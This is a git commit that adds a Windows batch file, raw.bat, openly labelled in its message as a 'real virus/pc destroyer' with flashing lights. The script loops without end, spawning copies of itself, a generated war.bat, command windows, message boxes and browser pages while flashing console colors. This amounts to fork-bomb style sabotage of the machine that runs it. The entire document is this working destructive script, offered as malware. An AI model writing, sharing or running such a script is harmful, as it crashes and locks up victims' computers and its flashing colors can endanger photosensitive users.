687af6a352a2d59018e1820be70f02f4aaa67495
FOX GAMINGYT <105371123+FoxGamingYTCR@users.noreply.github.com>
2022-05-11 13:14:47 -0400

    Raw.bat real virus/pc destroyer (flashing lights)
    this will destroy your pc, there are a lot of flashing lights/changing colors. this is a real virus.

---
+++ raw.bat
@@ -0,0 +1,20 @@
+@echo off
+echo @echo off >> war.bat
+echo :a >> war.bat
+start calc >> war.bat
+color 2 >> war.bat
+echo start war.bat >> war.bat
+echo msg * %random%%random% >> war.bat
+echo start raw.bat >> war.bat
+start www.youareanidiot.cc >> war.bat
+color 4 >> war.bat
+echo goto :a >> war.bat
+:e
+color 20
+start cmd
+start war.bat
+msg * %random%%random%
+start raw.bat
+start www.google.com
+color 40
+goto :e
